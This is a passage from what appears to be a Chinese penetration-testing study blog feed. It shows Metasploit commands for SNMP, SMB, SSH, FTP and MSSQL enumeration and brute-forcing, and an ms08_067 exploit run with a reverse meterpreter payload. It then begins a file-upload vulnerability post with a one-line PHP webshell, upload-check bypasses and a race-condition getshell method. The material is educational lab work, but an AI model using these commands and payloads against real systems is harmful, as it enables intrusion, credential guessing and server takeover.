auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enummsf auxiliary(scanner/snmp/snmp_enum) &gt; show options msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）msf auxiliary(scanner/snmp/snmp_enum) &gt; runmsf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusersmsf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadminmsf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumsharesmsf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadminmsf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul><li>SMB 版本扫描<ul><li>use auxiliary/scanner/smb/smb_version</li></ul></li><li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul></li><li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul></li><li>SMB 共享账号（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumshares</li></ul></li><li>SMB 用户枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumusers</li></ul></li><li>SID 枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul></li><li>SMB 版本扫描</li></ul><pre><code>msf &gt; search smbmsf &gt; use auxiliary/scanner/smb/smb_versionmsf auxiliary(scanner/smb/smb_version) &gt; show options msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administratormsf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul><li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditormsf auxiliary(scanner/smb/pipe_auditor) &gt; show options msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul><li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditormsf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul><li>SMB 共享账号（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumsharesmsf auxiliary(scanner/smb/smb_enumshares) &gt; show options msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul><li>SMB 用户枚举（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusersmsf auxiliary(scanner/smb/smb_enumusers) &gt; show options msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul><li>SID 枚举（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsidmsf auxiliary(scanner/smb/smb_lookupsid) &gt; show options msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul><li>SSH 版本扫描<ul><li>use auxiliary/scanner/ssh/ssh_version</li></ul></li><li>SSH 密码爆破<ul><li>use auxiliary/scanner/ssh/ssh_login<ul><li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li></ul></li></ul></li><li>SSH 公钥登陆<ul><li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul><li>set KEY_FILE id_rsa；set USERNAME root ；run</li></ul></li></ul></li><li>SSH 版本扫描</li></ul><pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_versionmsf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul><li>SSH 密码爆破</li></ul><pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt msf &gt; use auxiliary/scanner/ssh/ssh_loginmsf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txtmsf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul><li>SSH 公钥登陆</li></ul><pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkeymsf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME rootmsf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul><li><p>基于已经取得的 session 进行检测</p></li><li><p>use post/windows/gather/enum_patches</p><ul><li>show advanced</li><li>set VERBOSE yes</li></ul></li><li><p>检查失败</p><ul><li>known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次进行尝试</li></ul></li><li><p>ms08-067</p></li></ul><pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapimsf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.147msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/ms08_067_netapi) &gt; run</code></pre><p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p><pre><code>meterpreter &gt; backgrounmsf exploit(windows/smb/ms08_067_netapi) &gt; sessions </code></pre><p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p><pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/enum_patchesmsf post(windows/gather/enum_patches) &gt; set SESSION 4msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p><pre><code># 进程错误，迁移进程msf post(windows/gather/enum_patches) &gt; sessions -i 4meterpreter &gt; getpidmeterpreter &gt; psmeterpreter &gt; migrate 828  # spoolsv.exemeterpreter &gt; background msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p><h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul><li><p>mssql 扫描端口</p><ul><li>TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</li><li>use auxiliary/scanner/mssql/mssql_ping</li></ul></li><li><p>爆破 mssql 密码</p></li><li><p>use auxiliary/scanner/mssql/mssql_login</p></li><li><p>远程执行代码（获取数据库权限之后）</p></li><li><p>use auxiliary/admin/mssql/mssql_exec</p><ul><li>set CMD net user user1 pass123 /ADD</li></ul></li><li><p>mssql扫描端口</p></li></ul><pre><code>msf &gt; use auxiliary/scanner/mssql/mssql_pingmsf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul><li><p>ftp 版本扫描</p><ul><li>use auxiliary/scanner/ftp/ftp_version</li><li>use auxiliary/scanner/ftp/anonymous</li><li>use auxiliary/scanner/ftp/ftp_login</li></ul></li><li><p>use auxiliary/scanner/ [tab]</p></li><li><p>Display all 479 possibilities? (y or n)</p></li><li><p>查询版本信息</p></li></ul><pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_versionmsf (scanner/ftp/ftp_version) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ftp/ftp_version) &gt; run</code></pre><p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p><ul><li><p>是否允许匿名登录</p><pre><code>msf &gt; use auxiliary/scanner/ftp/anonymousmsf auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ftp/anonymous) &gt; run</code></pre></li></ul><p><img src="https://i.imgur.com/A6Ms8B3.png" alt="img"></p><ul><li><p>暴力破解</p><pre><code>use auxiliary/scanner/ftp/ftp_login</code></pre></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试——Mestasploit-基本使用&quot;&gt;&lt;a href=&quot;#渗透测试——Mestasploit-基本使用&quot; class=&quot;headerlink&quot; title=&quot;渗透测试——Mestasploit 基本使用&quot;&gt;&lt;/a&gt;渗透测试——Mestasploit 基本
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞学习</title>
    <link href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/"/>
    <id>https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/</id>
    <published>2020-04-03T08:49:18.000Z</published>
    <updated>2020-04-29T10:49:53.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p><p><strong>关于PHP中$_FILES数组的使用方法</strong></p><pre><code>$_FILES\[‘file’][‘name’] 客户端文件名称$_FILES\[‘file’][‘type’] 文件的MIME类型$_FILES\[‘file’][‘size’] 文件大小 单位字节$_FILES\[‘file’][‘tmp_name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</code></pre><p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p><h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p><pre><code>#!phpif($operateId == 1){    $date = date(&quot;Ymd&quot;);    $dest = $CONFIG-&gt;basePath.&quot;data/files/&quot;.$date.&quot;/&quot;;    $COMMON-&gt;createDir($dest);    //if (!is_dir($dest))   mkdir($dest, 0777);    $nameExt = strtolower($COMMON-&gt;getFileExtName($_FILES[&#39;Filedata&#39;][&#39;name&#39;]));    $allowedType = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;png&#39;, &#39;jpeg&#39;);    if(!in_array($nameExt, $allowedType)){        $msg = 0;    }    if(empty($msg)){        $filename = getmicrotime().&#39;.&#39;.$nameExt;        $file_url = urlencode($CONFIG-&gt;baseUrl.&#39;data/files/&#39;.$date.&quot;/&quot;.$filename);        $filename = $dest.$filename;        if(empty($_FILES[&#39;Filedata&#39;][&#39;error&#39;])){            move_uploaded_file($_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;],$filename);        }        if (file_exists($filename)){            //$msg = 1;            $msg = $file_url;            @chmod($filename, 0444);        }else{            $msg = 0;        }    }    $outMsg = &quot;fileUrl=&quot;.$msg;    $_SESSION[&quot;eoutmsg&quot;] = $outMsg;    exit;}</code></pre><h4 id="文件上传漏洞的利用"><a href="#文件上传漏洞的利用" class="headerlink" title="文件上传漏洞的利用"></a>文件上传漏洞的利用</h4><p>​        这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><ul><li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；</li><li>上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；</li><li>上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；</li><li>上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</li><li>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。</li></ul><h5 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h5><p>Webshell:大马、小马</p><ul><li>大马：代码量多，功能多</li><li>小马：代码量少，功能也少</li></ul><p>例如：一句话木马<?php eval($_POST[‘a’]); ?>    单引号可不加，只能接受php代码</p><p><strong>菜刀种类</strong></p><ul><li>中国菜刀：基本都有后门，强烈不推荐使用</li><li>cknife（C刀）：一般</li><li>蚁剑：js开发，中国菜刀js版，推荐使用，github有</li><li>冰蝎：自带加密，木马没有特征，极力推荐使用，github有</li><li>k8飞刀：推荐使用，工具多</li></ul><p>什么时候用大马？什么时候用小马？什么时候用过狗马？</p><ul><li>过狗小马：冰蝎小马</li><li>过狗大马：过狗大马</li><li>遇到安全狗，直接上大马，不考虑小马，原因：菜刀流量特征明显，而大马是正常文件正常访问。小马才需要菜刀连接，大马不需要。</li></ul><h4 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h4><p>条件竞争漏洞,</p><p>接着看下面这段代码(摘自某VPN系统)</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#!php</span><span class="token delimiter">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">mb_convert_encoding</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"GBK"</span><span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Pragma:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Length:"</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition:attachment;filename=\"$file\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p><p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p><p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p><p>具体利用方法：</p><p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p><h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul><li>客户端javascript校验（一般只校验后缀名）</li><li>服务端校验</li><li>文件头content-type字段校验（image/gif）</li><li>文件内容头校验（GIF89a）</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li><li>WAF设备校验（根据不同的WAF产品而定）</li></ul><h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p><p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p><h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p><p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p><p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p><h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token comment" spellcheck="true">//文件上传漏洞演示脚本之js验证</span>$uploaddir <span class="token operator">=</span> <span class="token string">'uploads/'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$uploaddir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $uploaddir <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            echo <span class="token string">'文件上传成功，保存于：'</span> <span class="token punctuation">.</span> $uploaddir <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span>$uploaddir <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//print_r($_FILES);</span><span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>    <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=gbk"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"content-language"</span> content<span class="token operator">=</span><span class="token string">"zh-CN"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>       <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upfile'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你还没有选择任何文件，不能上传!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>            <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.jpeg|.png|.gif|.bmp|"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//提取上传文件的类型</span>            <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//alert(ext_name);</span>            <span class="token comment" spellcheck="true">//alert(ext_name + "|");</span>            <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span>     ext_name<span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">""</span> method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span> name<span class="token operator">=</span><span class="token string">"upload"</span> onsubmit<span class="token operator">=</span><span class="token string">"return     checkFile()"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"MAX_FILE_SIZE"</span> value<span class="token operator">=</span><span class="token string">"204800"</span><span class="token operator">/</span><span class="token operator">></span>    请选择要上传的文件：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"上传"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p><h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p><h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME 